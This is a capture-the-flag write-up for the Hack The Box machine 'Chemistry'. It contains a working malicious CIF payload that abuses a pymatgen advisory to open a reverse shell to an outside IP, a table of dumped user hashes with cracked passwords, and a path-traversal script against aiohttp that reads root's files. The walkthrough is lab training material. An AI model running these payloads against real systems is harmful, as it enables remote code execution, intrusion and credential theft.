# Chemistry - HTB Write-up
<img src="https://labs.hackthebox.com/storage/avatars/b8f3d660af2d3ed0929eb119e33526cf.png" width="200" height="200">

## Initial portscan
```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 08 Mar 2025 13:55:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

## Foothold
The webpage gives us an upload form after you register with a free account.

Also gives us an example of a CIF file, download it. 

Searching the iNet for exploits on CIF file I found:
- https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Here is the payload:
```shell
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.115/1337 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

Dump the secrets of the SQLite database.

Now pass the hashes in crackstation to get some passwds!

```shell
-------------------------------------------------------------------------------
id	username	password                                crackstation passwd
-------------------------------------------------------------------------------
1	admin	    2861debaf8d99436a10ed6f75a252abf        unicorniosrosados
2	app	        197865e46b878d9e74a0346b6d59886a
3	rosa	    63ed86ee9f624c7b14f1d4f43dc251a5
4	robert	    02fcf7cfc10adc37959fb21f06c6b467
5	jobert	    3dec299e06f7ed187bac06bd3b670ab2
6	carlos	    9ad48828b0955513f7cf0f7f6510c8f8        carlos123
7	peter	    6845c17d298d95aa942127bdad2ceb9b        peterparker
8	victoria	c3601ad2286a4293868ec2a4bc606ba3        victoria123
9	tania	    a4aa55e816205dc0389591c9f82f43bb
10	eusebio	    6cad48078d0241cca9a7b322ecd073b3
11	gelacia	    4af70c80b68267012ecdac9a7e916d18
12	fabian	    4e5d71f53fdd2eabdbabb233113b5dc0
13	axel	    9347f9724ca083b17e39555c36fd9007
14	kristel	    6896ba7b11a62cacffbdaded457c6d92
15	dqwdqd	    36aa69f4d3824a9a431ea51955dbc542        wqdqd
```

Use SSH to connect with the rosa user and output the processes using `ps -ef`

```shell
app         1034       1  1 13:44 ?        00:01:03 /usr/bin/python3.9 /home/app/app.py
root        1035       1  0 13:44 ?        00:00:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
```

Notice the root user running `/usr/bin/python3.9 /opt/monitoring_site/app.py`. 

Trying to take a look at `/opt/` directory gives us a beautiful Permission Denied :(

Instead, let's try to look up for open ports:

```shell
rosa@chemistry:/opt$ netstat -plant
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.129.47.93:45524      8.8.8.8:53              SYN_SENT    -                   
tcp        0      0 10.129.47.93:50174      10.10.14.115:1337       ESTABLISHED -                   
tcp        0      0 10.129.47.93:5000       10.10.14.115:36406      ESTABLISHED -                   
tcp        0    432 10.129.47.93:22         10.10.14.115:37788      ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

Let's bring port 8080 to our localhost.

Intercept the requests with BurpSuite and notice the following header:
- `Server: Python/3.9 aiohttp/3.9.1`

Search for vulnerabilities and find path transversal (CVE-2024-23334-PoC)

The script needs a little modification, so we can get `/root/root.txt`.

```shell
#!/bin/bash
url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $url$payload$file"
    curl --path-as-is  "$url$payload$file"
    # status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    # echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```
